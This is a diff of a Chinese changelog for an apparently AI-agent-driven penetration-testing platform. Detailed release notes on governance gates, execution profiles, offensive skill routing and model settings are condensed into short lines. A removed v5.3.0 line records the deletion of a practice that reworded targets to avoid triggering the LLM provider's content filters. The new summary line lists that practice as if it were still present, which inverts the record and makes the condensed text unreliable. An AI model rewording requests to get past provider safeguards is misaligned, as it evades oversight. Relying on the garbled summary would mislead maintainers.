@@ -8,780 +8,695 @@
 
 ## v5.4.3 · 2026-11-17
 
-- 新增（A·收口执行闭环）：收口前扫描 .async/ 状态侧车——已完成（finished/failed）且结论未进证据链的后台作业，输出尾部自动落证据+时间线（harvestAsyncOutputs）；V3「就绪未投递」清单按作业实际状态校正（资产已被后台作业执行的不再误标）。通用机制：只核对「启动→完成→消费」三态一致性，不读作业内容做语义判断，对任意后台用途同构生效（实证缺陷：某判别作业 finished 落盘但收口台账误标未投递，结论仅存叙事交付物）
-- 新增（B·覆盖台账自描述契约）：update_coverage 四个结论态（vulnerable/ruled_out/no_issue_found/needs_follow_up）notes 必填——空依据入口拒收（有状态必有依据）；deterministicGate 新增收口兜底检查（本收口阶段名下结论态条目 notes 为空进拦截清单，跨阶段历史条目不连坐）。waf_blocked/skipped 过渡态豁免
-- 修复（C·治理门精确性与可解释性）：规则⑤「订单/支付/短信状态变更」关键词全部词边界锚定（原 pay 无边界子串曾命中 payloads 导致纯只读工具预检命令连坐被拦——实证）；新增 skipIfReadOnly 规则字段（状态变更合取类规则对只读命令豁免，SQL 写/HTTP DELETE/导出类不豁免——拦截能力零放松）；拦截消息附规则名+命中文本（可解释拒绝，执行主体一次自纠）；registrationGate 拒绝文案补充混合命令拆分指引
-- 测试：TestV543HarvestAsyncOutputs（收割+幂等消费判定+在途不收）/TestV543HarvestV3ListsSkipsExecutedVT（已执行 VT 不误标）/TestV543UpdateCoverageNoteRequired（空依据拒收+过渡态豁免）/TestV543DeterministicGateCoverageNote（收口兜底+跨阶段不连坐）/TestV543ProfileWordBoundaryAndReadOnlyExemption（词边界/只读豁免/非只读不豁免/真实变更仍拦）/TestV543ProfileGateMessageExplainable（消息含规则名+命中文本+泛化预检放行）——全部泛化样本，无项目特定内容；go 全测 6 包全绿
-- 部署完成（v5.4.3）：回滚点 jiutouniao:rollback-5.4.2 留存，容器 recreate 后 /api/public/info version=5.4.3；运行中任务 auto_resume 断点续测
+- 新增（收口执行闭环）：收口前扫描后台作业状态侧车，已完成且结论未进入证据链的作业自动落证据与时间线；「就绪未投递」清单按作业实际状态校正
+- 新增（覆盖台账自描述契约）：update_coverage 四个结论态 notes 必填，空依据入口拒收；收口确定性门新增兜底检查
+- 修复（治理门精确性与可解释性）：状态变更规则关键词词边界锚定；只读命令豁免状态变更合取类规则；拦截消息附规则名与命中文本；注册门补充混合命令拆分指引
 
 ## v5.4.2 · 2026-11-17
 
-- 修复（下拉背景纯黑·用户实测反馈）：v5.4.1 自定义下拉的背景误用不存在的主题变量（var(--card, var(--bg-card, #1b2230))——两个变量名都未定义，回落到写死深色 #1b2230），亮色主题下下拉框呈纯黑；改用实际存在的 var(--bg2)（亮=#ffffff/暗=#161b22）与 var(--shadow-lg)，明暗两主题均与卡片/弹窗表面一致
-- - 部署完成（v5.4.2）：回滚点 jiutouniao:rollback-5.4.1 留存，容器 recreate 后 /api/public/info version=5.4.2；运行中任务 auto_resume 断点续测；生产环境 headless 双主题实测——亮色下拉背景 rgb(255,255,255)/暗色 rgb(22,27,34)，候选文字可读
+- 修复（下拉框主题适配）：模型名下拉背景改用主题变量与主题阴影，明暗两主题与卡片表面一致
 
 ## v5.4.1 · 2026-11-17
 
-- 修复（拉取模型列表后看不到其它候选·用户实测反馈）：模型名下拉弃用原生 datalist——其按输入值过滤候选（输入框已有 deepseek-chat 时，deepseek-reasoner 因不含该子串被滤掉，实测拉取 2 个只显示 1 个）；改为自定义下拉：聚焦/点击 ▾ 显示全部候选、输入时子串过滤（不区分大小写）、点击条目填入、失焦关闭；拉取成功后立即展开全部候选；样式复用主题变量（暗/亮自适应），手动填写不受影响
-- 部署完成（v5.4.1）：回滚点 jiutouniao:rollback-5.4.0 留存，容器 recreate 后 /api/public/info version=5.4.1；运行中任务 auto_resume 断点续测；生产环境 headless 实测用户报告场景（输入框有 deepseek-chat 时拉取候选）——下拉显示全部候选并可点击填入
+- 修复（模型候选下拉）：模型名下拉改为自定义组件——聚焦显示全部候选、输入时过滤、点击填入、失焦关闭；拉取成功后自动展开全部候选
 
 ## v5.4.0 · 2026-11-17
 
-- 修复（P1·创建页选择模型静默失效）：orch.CreateProject 构造持久化对象时漏拷 ModelID 字段——Web 层正确接收并传入，但落库恒为空，clientFor 读到空值静默回退默认模型且无任何提示（实证：32/32 项目 model_id 全空，创建页选 DeepSeek 实际跑 glm-5.3-flash）；补拷一行修复 + TestV540CreateProjectCarriesModelID 回归（还原缺陷即抓出）+ TestV540CreateProjectEmptyModelIDOK（默认路径不受影响）
-- 新增（选择模型三重加固）：①handleCreateProject 前置校验 model_id——不在注册表直接 400（原静默回退）；②clientFor 对「项目指定模型不在注册表」每项目一次日志留痕（TestV540ClientForFallbackWarnOnce 验证去重，防每轮 LLM 调用刷日志）；③模型注册表读取逻辑不变（项目指定 > 默认 > 兜底）
-- 新增（模型连通性测试）：POST /api/settings/models/test——真实 LLM 调用验证（中性探针「回复 OK」，max_tokens=96（推理型模型思考耗 token，实证 16 会全花在 reasoning 上），60s 超时容忍共享网关排队），支持两种模式：按已存模型 id 测（服务端解密已存 key）/ 表单未保存字段直测（key 留空回退已存 key，编辑场景）；可抓出 401 密钥无效/404 模型名错/402 欠费/400 参数错四类问题；单次成本几十 token；错误输出过密钥脱敏（maskKey），日志只记 host+耗时
-- 新增（设置页模型卡片 UI）：每个已保存模型行新增「测试」按钮（行内显示 ✅ 耗时/tokens/回复 或 ❌ 错误详情）与「编辑」按钮（回填表单）；表单新增「先测试连接」（保存前即可验证）；结果文案明示边界——中性探针不覆盖业务内容风控（如 DeepSeek 对渗透语义的 Content Exists Risk 拦截）
-- 新增（服务商模型列表拉取）：POST /api/settings/models/available——服务端以表单/已存 key 调服务商模型列举接口（openai 协议 GET {base}/models Bearer；anthropic 协议 /v1/models x-api-key+version），兼容 {data:[{id}]}/{models:[...]}/[id,...] 三种响应形态，去重排序封顶 500；api_key 走 POST body 不进 URL 查询串（防访问日志留存）
-- 新增（模型名下拉选择）：模型名输入框升级为可搜索下拉（datalist）+「拉取模型列表」按钮——实时清单优先，拉取失败/不支持列举的服务商自动回退内置预设清单，始终保留手填；清单来源实时标注（实时拉取 N 个 / 预设清单 / 拉取失败回退）
-- 新增（服务商预设扩容）：5→23 个预设——新增 火山方舟Coding/智谱GLM/Kimi/阿里百炼/百度千帆/腾讯混元/MiniMax/讯飞星火/硅基流动/Google Gemini（OpenAI 兼容层）/xAI Grok/Mistral/Groq/OpenRouter/Together/vLLM/LM Studio/自定义聚合，全部自动填 URL+协议+常见模型清单（静态兜底）；火山方舟预设 URL 修正为 /api/v3 并新增 /api/coding/v3 专用预设
-- 修复（协议选择）：添加/修改模型的协议改显式下拉（openai/anthropic）——原实现依赖预设名判断（选「自定义」无法指定协议，anthropic 只能靠预设名命中）
-- 测试：TestV540FetchProviderModelsDataShape/ModelsShape/AuthHeaders（解析三形态+双协议鉴权头+anthropic 路径追加）、TestV540ResolveModelCfgStoredKeyFallback（id 回退已存 key/表单覆盖/本地空 key/anthropic 必填/base_url 形态/脱敏）、TestV540CreateProjectCarriesModelID 三件套；go build/vet/全测全绿
-- 核查口径：连续三轮全量核查通过（每轮=代码级 go build/vet/全测 6 包全绿 + API 级 14 项断言 + UI 级 headless Chromium 10 项断言）——三轮 glm 连通性实测均回复 OK（4.4s/2.2s/4s，94 tokens）；负面用例（错 key 401/缺 model 400/无效 model_id 400/不可达列举 502）全部按预期失败且无密钥泄漏；DeepSeek 生产密钥经连通性实测确认有效（回复 OK）
-- 部署口径：镜像 jiutouniao:5.4.0-pending 预构建待命，运行中任务结项后零中断切换（沿用 v5.3.9 先例）；切换后 /api/public/info 应为 5.4.0，创建页选模型自此真实生效
-- 部署完成（v5.4.0）：回滚点 jiutouniao:rollback-5.3.9 留存，镜像 5.4.0-pending→latest 晋级，容器 recreate 后 /api/public/info version=5.4.0；两运行中任务中断即置 paused（内部任务编号已泛化），auto_resume 30s 内断点续测（done 阶段自动跳过，s3/s2 各归其位续跑）；多模型注册表恢复 2 个默认 glm
+- 修复（创建页选择模型）：创建项目时漏持久化所选模型导致选择不生效——补齐字段持久化
+- 新增（选择模型校验）：创建项目校验模型 ID 有效性，无效直接拒绝；运行时无效指定记录日志并回退默认
+- 新增（模型连通性测试）：真实 LLM 调用验证模型可用性，支持按已存模型或表单字段测试；错误输出脱敏
+- 新增（设置页模型卡片）：已存模型行新增测试与编辑按钮；表单新增保存前连通性测试
+- 新增（服务商模型列表拉取）：拉取服务商模型清单，兼容三种响应形态；API Key 走请求体
+- 新增（模型名下拉选择）：模型名输入框升级为可搜索下拉，实时清单优先、失败回退预设清单、保留手填
+- 新增（服务商预设扩容）：预设 5→23 个，自动填 URL、协议与常见模型清单
+- 修复（协议选择）：添加模型协议改为显式下拉选择
 
 ## v5.3.9 · 2026-11-16
 
-- 新增（架构信号→技能强制路由）：00-router 资产表新增 5 行确定性映射——网关统一路由/多异构后端→request-smuggling+intranet-lateral；JWT/令牌机制确证或密钥材料泄露→jwt-crypto；SSO/票据/扫码机制→auth-flow-deep+jwt-crypto；同应用多实例/多节点→instance-diff；登录态不可得→observable-degradation——架构确证即触发，不再依赖模型自主联想
-- 新增（instance-diff 技能）：同构多实例/多节点行为差分手册——同构性判定四件套+共享态验证+行为差分矩阵五维（状态码/响应头/body 结构/行为语义/密钥配置值），差异=配置漂移/版本滞后/门控不一致信号
-- 新增（observable-degradation 技能）：无账号观测降级轨——身份索取闭环走完仍无登录态时，认证后项禁止直接 premise_failed 全量移交，先过四条替代观测（时延侧信道/缓存行为差分/错误文案差分/自建数据回流）
-- 配套：skills/manifest.json 单源重生成（107→109 技能），--check 一致性通过
-- 新增（批次②·S1 OOB 通道预热）：interactsh 注册前移到 S1 工具自检，回连域/自检日志落盘 evidence/oob/，盲打窗口不再被中途安装消耗
-- 新增（批次②·S2-10/S2-11）：四类架构信号确证即 record_vt(Priority=1) 强制登记；拓扑重建活交付物 V1→VN，S6/S8 强制引用最新版
-- 新增（批次②·S4 三强制）：架构信号 VT 保底；带态越权矩阵第二遍（api-idor+idor-baseline 三轴）；密钥泄露→jwt-crypto 全算法族、SSO 机制→滥用矩阵
-- 新增（批次③·S5/S6/S8 三头增补）：无账号观测降级轨强制前置；凭据复用矩阵（weak-cred-bruteforce 新节）；实例差分前置+拓扑引用强制；S8 影响评估引用拓扑版本号+盲区章对账
-- 新增（批次④·引擎 P1 保底）：预算冲刺消息 VT 枚举按 Priority 升序排序+P1 保底文案，与 S2-10 架构信号 VT 联动
-- 新增（批次④·lessons 栈指纹加权）：教训注入按目标指纹对 Stack/Tags 评分排序（命中前置+标注），零命中保底全量注入
-- 新增（批次④·health-window.sh 健康窗口包裹器）：目标抖动不烧探测轮次，窗口恢复自动执行，证据带窗口健康标注；版本 5.3.8→5.3.9，go 全测全绿
-- 新增（批次⑤·评测 hidden 维度）：预期清单新增 4 类 hidden 项（内网拓扑/带态越权矩阵/SSO 票据滥用/请求走私检查）——盲挖能力度量扩展到方法论执行率维度
-- 部署口径：提示层即时生效于新项目/后续阶段；引擎改动镜像预构建待命，运行中任务结项后零中断切换
-- 核查口径：五批次各 3× 连续核查 + 终局全量 3× 核查全通过；全部新增内容经敏感信息扫描零命中
-- 部署完成（v5.3.9）：回滚点 rollback-5.3.8 留存，容器 recreate 后 /api/public/info version=5.3.9，项目数据完整无损
+- 新增（架构信号路由）：资产路由表新增五类确定性映射，架构特征确证即触发对应技能
+- 新增（实例差分技能）：同构多实例行为差分手册
+- 新增（无账号观测降级轨）：身份获取失败时的替代观测路径
+- 增强（技能清单）：skills/manifest.json 单源重生成
+- 新增（OOB 通道预热）：interactsh 注册前移至开工工具自检
+- 新增（架构信号验证队列）：架构特征确证即登记验证任务；拓扑重建为活交付物
+- 新增（越权矩阵第二遍）：登录态越权矩阵标准化
+- 新增（凭据复用矩阵）：弱口令技能新增复用矩阵节
+- 新增（阶段头增补）：观测降级轨前置、实例差分前置、拓扑引用强制
+- 新增（验证队列保底）：预算冲刺消息按优先级排序
+- 新增（教训栈指纹加权）：教训注入按目标指纹评分排序
+- 新增（健康窗口包裹器）：目标抖动时等待窗口恢复再探测
+- 新增（评测 hidden 维度）：预期清单新增四类隐藏项
 
 ## v5.3.8 · 2026-11-15
 
-- 修复（收口死锁 P0·实证）：反思门不可用期间多个阶段被打 quality-pending 复核标记（v4.8 设计），但 s8 收口门把该标记当硬拦截项且清除标记无任何工具/API 通道——构成死锁：模型穷尽 8 条排查路径仍被永久拦截，s8 无法收口（实证某医院任务 s1-s7 全 done 后 s8 空转 35 分钟+，msgs=210、单请求 106k tokens 零产出）。A+B 组合修复：①deterministicGate 移除 quality-pending 硬拒（旧拦截文案「确认无缺口后忽略本条说明」无实现通道）；②complete_stage 入口软提示 + confirm_quality_review 显式确认参数——确认后清除标记（改写 quality-reviewed 留痕）并正常收口；s8 头补复核操作指引；v46b 旧测试更新为新契约（新增 TestV538QualityReviewConfirm/TestV538DeterministicGateNoDeadlock 回归）
+- 修复（收口死锁）：反思门不可用期间的复核标记不再硬性拦截收口，新增显式确认参数清除标记后正常收口
 
 ## v5.3.7 · 2026-11-14
 
-- 新增（后渗透勾选·用户方案）：创建项目新增「后渗透阶段」复选框（默认不执行）——不勾选则 s6（提权/横向/权限维持/云逃逸/存量排查）整段 skipped（applyPostExploitGate，Summary 留痕「范围决策非漏测」，流水线自然落到 s7/s8，allStagesSettled 已认 skipped 终态）；勾选则按流水线正常进行；工作台手动单阶段重跑 s6 不受门限制（明确意图优先）；重启续跑幂等；s8 报告强制标注「后渗透：创建时未勾选，未执行」防默默省略；默认不执行与 production_safe 执行档互补——省去被治理门反复拦截的空转轮次
-- 重构（创建表单标准化·用户需求）：授权范围/ROE/成功标准三个自由文本域统一「编号小节」结构——授权范围=【授权目标 in-scope】/【明确排除 out-of-scope】/【通用边界】；ROE=【一~六】授权与范围/行为边界/数据与取证/身份与账号/清理与移交/沟通与应急（锁定合规短语全部保留）；成功标准=【测试目的】/【成功标准】三要素；空态自动预填 + 「重置标准范围/ROE/口径」一键恢复；快速模板叠加位改为【七、专项条款】
+- 新增（后渗透勾选）：创建项目新增后渗透阶段复选框，默认不执行，报告强制标注
+- 重构（创建表单标准化）：授权范围/ROE/成功标准统一编号小节结构，空态自动预填与一键恢复
 
 ## v5.3.6 · 2026-11-14
 
-- 重构（漏洞展示·用户方案四项决策）：发现页改为「漏洞名主行 + 折叠详情」卡片——折叠内三段：漏洞详细（detail）/ POC 展示（Burp 式请求/响应原文双栏）/ 修复建议（remediation）；默认全部收起；等级×置信度矩阵与筛选行不动
-- 新增（POC 自包含）：record_finding 新增 poc 参数（实测原始 HTTP 请求/响应对，逐字誊写 ≤5 组、单侧 16KB 截断、空侧拒绝——禁止编造）+ remediation 参数（修复措施+验证方法，LLM 提供）；模型未提供 poc 时 Web 层证据回填（最新命令类证据 Input=请求侧/Output=响应侧，标记 backfilled，只读不改库）
-- 修复（证据链悬空·随废弃根治）：evidence_ids 参数废弃——模型无渠道获知引擎内部证据编号，显式提供必然杜撰（实证（v5.3.4 后首个新任务）：10 条 finding 12 个引用 100% 悬空；缺陷自 v5.3.0 潜伏、被 v5.3.4 schema 修复激活）；现在一律引擎自动关联本阶段最近真实证据，字段保留供旧数据展示
-- 配套：report-writing/s8/poc-template 提示词与 detail/poc/remediation 三字段同源对齐（页面与报告一致）；TestV536RecordFindingPOC 单测（POC 落库/杜撰编号忽略/空侧拒绝/超量拒绝）；file_layer ㉘ 重锁
-- 部署口径：镜像预构建待命，运行中任务完成后零中断切换（用户决策）
+- 重构（漏洞展示）：发现页改为漏洞名主行+折叠详情卡片（详情/POC/修复建议三段）
+- 新增（POC 自包含）：record_finding 新增 poc 与 remediation 参数，未提供时由证据回填
+- 修复（证据引用）：evidence_ids 参数废弃，引擎自动关联本阶段真实证据
 
 ## v5.3.5 · 2026-11-14
 
-- 新增（项目删除）：DELETE /api/projects/{id}——彻底删除：bbolt 全部项目作用域记录（发现/资产/时间线/审批/证据/覆盖/用量/会话/执行流/子任务/提问/黑板/战利品/验证队列，含键前缀桶 coverage=ID\x00、stream=ID|seq）+ 工作区目录（deliverables/evidence/report）；运行中项目拒绝（先 kill）；组织级桶（跨项目教训库/全局设置）不触碰；引擎内存注册表（活指针/指令队列/回环/预算器/对话/子代理）同步清理；单测覆盖全桶清空+组织级不波及+不存在报错；Web 顶栏新增「删除」按钮（熔断旁，运行中禁用，双重确认：确认对话框+输入项目编号）
-- 测试：go 全测全绿；发版核查 18/18
+- 新增（项目删除）：DELETE 接口彻底删除项目全部记录与工作区；运行中项目拒绝；顶栏新增删除按钮（双重确认）
 
 ## v5.3.4 · 2026-11-14
 
-- 修复（P0·新建任务 LLM 400 拒绝）：record_finding 的 evidence_ids 参数 schema 畸形——v5.3.0 P1-10 误用对象数组助手 arr() 包裹 str() 产物，items 被再包一层 {"type":"object","properties":…}，properties.type/description 沦为裸字符串；严格校验函数 schema 的供应商直接 400 拒绝整个请求（一报 Invalid schema for function record_finding，一报 InvalidParameter——两供应商同因拒绝），s1 无法启动，新建任务即「LLM 拒绝」。改用新增 arrStr() 助手（原始类型元素数组，items=完整 schema）；宽松校验供应商（v5.3.0~v5.3.3 期间项目）不受影响故此前未暴露
-- 新增（防回归）：TestV533ToolDefsSchemaStrict——全量 ToolDef 递归校验（properties/items 节点必须为 schema 对象，禁止裸值；回归自证：把修复还原测试即抓出原畸形）；文件层 ㉘ 锁定
-- 测试：go 全测全绿；发版核查 18/18；真实供应商实弹验证（修复后工具 schema 请求被正常接受）
+- 修复（工具 schema 畸形）：record_finding 参数 schema 修正
+- 新增（schema 防回归校验）：全量工具定义递归校验锁定
 
 ## v5.3.3 · 2026-11-14
 
-- 新增（P2-1 技能检索准确率测试）：eval/gates/fixtures/skill-retrieval/golden.json 金标集 46 条（源自 00-router 资产表 36 条 + 策展别名 10 条）+ eval/gates/skill_retrieval_gate.py 双层门（结构层：查询/期望 id/stage 良构校验；实跑层：go 桥接 TestV533GoldenRetrieval 用真实 SkillRegistry+manifest 跑金标）；实测 top3 召回 46/46=100%、top1 精确 39/46（85%）——min_pass_rate 85% 防知识面漂移回归；run_comprehensive 桥接
-- 新增（P2-2 高危盲测召回/精确率报告）：eval_run.py --blind-report PROJECT_ID——召回侧沿用 declared/hidden/mock/hidden_high 口径，精确率侧新增 findings 精度（命中预期/全部）与高危 findings 精度，清单外 extras 单列人工复核；阈值门 hidden_recall≥40% / 匿名高危召回≥40% / findings_precision≥30%；产出 eval/results/blind-<ts>.md（实测旧项目：precision 83%/hidden 50%/匿名高危 62% 全过线）
-- 新增（P2-3 匿名身份状态覆盖率测试）：eval_run.py --identity-coverage PROJECT_ID——三态（pure_anonymous/gate_found/identity_obtained）×鉴权族覆盖单元矩阵（鉴权/authz/越权/未授权/IDOR/BLSA/BFLA），按 notes/endpoint 关键词推断状态；硬门 pure_anonymous 态 needs_follow_up 占比 ≤60%（对齐 v5.1 全量未授权硬门「无 token 列纯匿名禁止推迟/抽样」）；产出 identity-coverage-<ts>.md
-- 新增（P2-4 端到端闭环验证门）：scripts/e2e_loop_check.py——四环断言：E2E-1 findings↔evidence_ids/claims 绑定与证据文件存在；E2E-2 阶段回环（覆盖账本复测痕迹 count≥2 或交付物链 ≥3 阶段承接）；E2E-3 覆盖↔发现闭环（每个 vulnerable 覆盖单元必有对应 finding；真阴性必须 negative_valid——E3 口径复用）；E2E-4 最终报告 1:1（≥80% finding 被报告引用；needs_follow_up 时必有待续/移交节）；--selftest 合成正反例夹具 4/4 环生效；run_comprehensive 桥接
-- 修复（配套）：run_all_gates.py --selftest 跳过非门夹具目录（skill-retrieval 金标集无 expected.txt 曾致夹具回归 FileNotFoundError）；v532_plan_priority 夹具终态显式置 finished（随机 id 序翻出末位断言的次序依赖）
-- 测试：全面核查 6/6（引擎全测/门夹具 14/14/文件层 548/548/检索准确率 46/46/e2e 自测 4/4/ROE 14 项）；发版核查/打包（v5.3.3）
+- 新增（技能检索金标集）：46 条金标与双层检索质量门
+- 新增（盲测召回报告）：召回与精确率双指标报告
+- 新增（身份覆盖测试）：三态身份覆盖率测试
+- 新增（端到端闭环验证门）：发现↔证据↔覆盖↔报告四环断言
+- 修复（评测脚本）：夹具目录与终态修正
 
 ## v5.3.2 · 2026-11-14
 
-- 新增（P1-1 Go 技能加载器消费 manifest）：LoadSkills 读 skills/manifest.json——条目 id↔.md 文件双向对齐校验 + count 核对，失配启动日志告警并降级 markdown-only（漂移不静默、不阻断）；aliases/depends_on/handoff_to/stage_fit/lab_only 元数据并入 Skill 结构；LabOnly 判定 manifest 标注为准、策展清单兜底（manifest 降级时 production_safe 横幅仍生效）
-- 新增（P1-2 manifest 单源生成器）：scripts/gen_skill_manifest.py——扫描 107 技能 frontmatter + 00-router「配合」列反向归集 + 正文 load_skill/配合引用扫描 + 关键技能策展覆盖表（27 技能 aliases/handoff_to）；--check 校验模式（漂移退出码 1）进文件层核查；修复 v5.3.0 遗留失配——manifest lab_only_actions 声称「见正文标注」但正文标注 0 存在：9 个高危技能（persistence/webshell-memshell/upload-bypass/logic-csrf-deser/database-postex/tunnel-pivot/cve-weaponization/crypto-offensive/hypothesis-0day）正文逐项补「Execution Profile 标注（v5.3.2）」节（Lab Only 动作清单+production_safe 口径+两档工件处置分流）；manifest 重生成：depends_on 74 / aliases 26 / stage_fit 97 / lab_only 9，引用零悬空
-- 新增（P1-3 检索升级）：Search 多关键词分词加权（id 精确/前后缀 15 / 别名 12 / 标题 10 / tags 5 / 正文 2，多词命中叠加，确定性三键排序保持）；SearchCtx 上下文感知（stage_fit/tags 命中当前阶段 +3，load_skill 检索按当前阶段调序）；Bundle 组合选择（主命中按 depends_on/handoff_to 去重展开配合技能，load_skill 无直检命中时自动组合展开）；技能索引行追加别名/配合/交接/[Lab Only] 摘要
-- 新增（P1-5 阶段内任务规划优先级自调）：Subtask 增加 Priority/PriorityWhy；rerankSubtasks 按①覆盖账本缺口（vulnerable 未闭环 +8 / needs_follow_up +3 / waf_blocked +2，特异性 token 匹配——中文词或 ≥5 字符 ASCII，通用短词 api/get 不参与避免误命中）②风险分级（L2 +2/L1 +1）③证据（已绑定 +2 / 声明未验证无证据 +4）排序；plan_subtasks 建档即返回 [P1]/[P2] 有序清单+依据；update_coverage 落账后自动重排（id 与内容稳定，只动优先级）；终态任务沉底
-- 统一（P1-4 执行模式语义，随 v5.3.1 P0-4 提前落地）：specA 前置契约模式推广至 s5/s6/s7「执行模式契约」节（生产=登记移交/实验室=快照恢复、两档共用高影响底线），与 loop-core 规则 6、execution-profiles.yaml、引擎 profileGate 四源一致；file_layer ㉖/㉗ 锁定组（+45 项）防回归
-- 测试：v532_skills_test（manifest 消费/降级/LabOnly/多关键词/别名/阶段感知/组合展开 7 组）+ v532_plan_priority_test（重排/落库/响应标签/覆盖随动）；go 全测全绿；文件层核查 532/532；发版核查/打包（v5.3.2）
+- 新增（技能清单消费）：技能加载器读取 manifest 双向校验与元数据并入
+- 新增（manifest 单源生成器）：生成器与校验模式；高危技能补 Lab Only 标注
+- 增强（技能检索）：多关键词加权、上下文感知排序、组合技能展开
+- 新增（子任务优先级自调）：按覆盖缺口/风险分级/证据状态自动重排
+- 统一（执行模式语义）：s5/s6/s7 增补执行模式契约节
 
 ## v5.3.1 · 2026-11-14
 
-- 新增（P0-1 Execution Profile 运行时·逐动作强制）：引擎新增 profile.go——解析 policies/execution-profiles.yaml（YAML 子集解析器，与 ROE Profile 同惯例，缺失/非法启动即失败）；production_safe/isolated_lab 双档编译期模式表（声明层 forbidden 行↔执行层规则一一对照）对每条命令逐动作校验：植入 webshell/内存马/持久化/隧道/新增账号、上传可执行文件、批量导出数据、修改/删除目标数据、订单支付短信状态变更为生产档硬禁令（此前 loop-core「引擎强制」为纸面承诺，声明文件无任何 Go 代码消费）；load_skill 对 Lab Only 高危技能注入禁用横幅；config 新增 engine.execution_profiles_path
-- 新增（P0-1 持久化与界面）：Project 增加 execution_profile 字段（store 层缺省收紧 production_safe，空/未知档一律按生产口径）；创建项目页新增执行档选择器（isolated_lab 须勾选隔离靶场快照回滚确认）；POST /api/projects/{id}/policy 支持运行中切档（SetExecutionProfile 活指针同步防旧快照回写）；governanceGates 阻断统一留证进证据链
-- 修复（P0-2 治理门全通道接线·高危）：registrationGate/scopeGate 此前仅在 shell_open 生效——run_command/run_async/shell_write/hexstrike_command 全部主通道绕过双门；新增 governanceGates 统一入口（profile+注册写+范围三门）接入全部 6 个命令执行通道，阻断发生在风险分级与审批之前（不烧审批槽位）；install_tool 安装命令同样过范围门（gitee.com 补入良性白名单）；通道级集成测试 v531_channel_gates_test.go 以「通道×门类型」矩阵锁定（每通道阻断断言+审批零工单+留证）
-- 修复（P0-3 评测脚本）：file_layer_check.py 死代码块修复——`if False:` 仅包住 subprocess 行，其后的模块级语句引用条件分支内定义的 r3（评测包未挂载时 NameError 崩溃、挂载时复用 stale r3 产生假「8/8」检查）；mock 冒烟 subprocess 加 300s 超时；jtn-evalpack 冒烟去抖——K4 锁定延长封顶 3×lock_secs（真实 WAF 同有上限，原 12 连发滚雪球 ~90s 等待）、burst 12→6 确定化、start() 清理孤儿端口监听（并行冒烟撞端口复用陈旧状态）、oauth 自测加 120s 超时——连续三轮 15/15
-- 统一（P0-4 双模式高影响限制）：loop-core 规则 6 明示「v5.3.1 起引擎逐动作强制」；s5/s6/s7 三头新增统一「执行模式契约」节（生产=登记移交/实验室=快照恢复、两档共用高影响底线：不波及存量数据+不向公网分发）；README 合规护栏补第 4 条确定性治理门说明；file_layer ㉖ 锁定组（+40 项）锁定引擎接线/持久化/前端选择器/声明层↔执行层双源对照
-- 测试：go 全测（engine/tools/web/store/config）全绿；文件层核查 496/496；冒烟 3 连轮 15/15；全量核查/发版核查/打包（v5.3.1）
+- 新增（Execution Profile 运行时）：执行档声明解析与双档逐动作强制；高危技能注入禁用横幅
+- 新增（执行档持久化与界面）：项目执行档字段、创建页选择器、运行中切档
+- 修复（治理门全通道接线）：注册写门与范围门接入全部命令执行通道
+- 修复（评测脚本）：死代码与冒烟超时修正
+- 统一（双模式高影响限制）：loop-core 与阶段头统一执行模式契约
 
 ## v5.3.0 · 2026-11-14
 
-- 重构（外部深度审计方案·批次A 策略收敛/P0）：S7 清理矛盾清零——heads/s7「就地中和」与「自建业务数据行 DELETE 执行侧」废止（与 v5.1.3 自建数据只登记不删除政策统一）；upload-bypass/logic-csrf-deser 清理措辞对齐；清理铁律补 Isolated Lab 快照回滚分支（生产与实验室共用"智能体不执行删除"，回收方式按模式分流）
-- 重构（批次A·P1-4/5/6）：loop-core 纪律 11 固定变异配额（12 探针/7 步链/5 绕过）改为证据驱动有限实验——预写假设/预期信号/请求预算/停止阈值，WAF 403 记 blocked 即合法终态，不以绕过数量为 ruled_out 前置（payload-mutation-algebra 降级为可选工具箱并加对齐说明）；纪律 12 身份三态 surface_found≠identity_obtained≠authenticated_session（L1 命中只记发现不建会话）；「目标引用中性化（供应商风控降触发）」整节删除——改为目标/授权/意图如实表述，供应商拒绝走正常故障路径
-- 重构（批次B·P1-1/7/8/9+P2）：main.md 诚实化为「全局指挥室与任务规划策略头」（不宣称动态重排）；authz-diff/gateway-filter 500 降为可达候选 Observation（确证须阳性/阴性对照+受保护资源差异三件套）；authz-diff §五新增「清点率 ≠ 测试执行率」概念分离（登记率 100% 归账 vs tested/blocked/deferred 分列），s4 收口双指标；s2 全端口扫描改条件策略档（授权+窗口+预算）；framework-priors/industry-templates 补反幻觉纪律（先验仅排序不生成 Finding）
-- 重构（批次B·P2-2/3）：AI 专项 5 技能+specA 补前置契约（Canary 标记/mock 工具/测试租户/合成文档——真实秘密非验证目标，副作用以真实工具事件日志确证）；APP/小程序 6 技能+specB1/B2 补结构化前置登记（artifact_source/device_owner/test_account/network_route/test_data/runtime_access/limitations——静态线索不替代动态确证）
-- 新增（批次C·P1-2/3/10 引擎配套）：update_coverage 状态白名单+旧状态确定性映射（premise_failed→needs_follow_up+precondition_missing；inconclusive→同；patched→复测证据才 no_issue_found 否则 patch_pending_retest；非法状态拒绝——policies/coverage-contract.json 单一事实源）；skills.go 检索确定性排序（同分按 ID）+ 候选扩至 top-5；record_finding 新增 evidence_ids 显式证据绑定参数（每条主张绑定特定证据，自动关联降为兜底）
-- 新增（方案 §14 工程化文件）：skills/manifest.json（107 技能机器可读清单，frontmatter 自动生成）+ policies/coverage-contract.json + policies/execution-profiles.yaml（双运行模式动作边界单一事实源，引擎按 execution_profile+scope+risk+approval 校验，缺省 production_safe）；Dockerfile COPY policies/
-- 修复（用户反馈·ROE 模板政策对齐）：项目创建页默认 ROE 模板三处旧口径——①「自建数据测试后精确清理」→「只登记移交、不执行删除/还原/清理（《需人工清理清单》四元组）」（v5.1.3 政策）；②补「注册面只评估不注册、不自动创建任何账号，身份经索取闭环向客户获得」（v5.1.1 政策，此前模板缺失且 Web 专项条款曾写「使用自建账号」已改「使用客户提供的测试账号」）；③审批策略描述对齐 v5.2.0 默认 manual（前端默认选中 l1→manual）；file_layer ㉕ 锁定组防回归
-- 测试：全量核查/发版核查/干净包验收 3 连轮 + 部署（v5.3.0）
+- 重构（S7 清理策略）：统一「登记移交、不执行删除」，补隔离靶场快照回滚分支
+- 重构（测试纪律）：变异配额改证据驱动有限实验；身份三态语义分离；目标引用中性化
+- 重构（提示词定位）：指挥头定位调整；越权差分降为可达候选；清点率与执行率分离
+- 重构（专项前置契约）：AI 专项与 APP/小程序技能补前置契约与结构化登记
+- 新增（覆盖状态契约）：状态白名单与旧状态映射；record_finding 新增证据绑定参数
+- 新增（工程化文件）：manifest、覆盖契约、执行档声明三份单一事实源
+- 修复（ROE 模板对齐）：默认模板三处旧口径修正
 
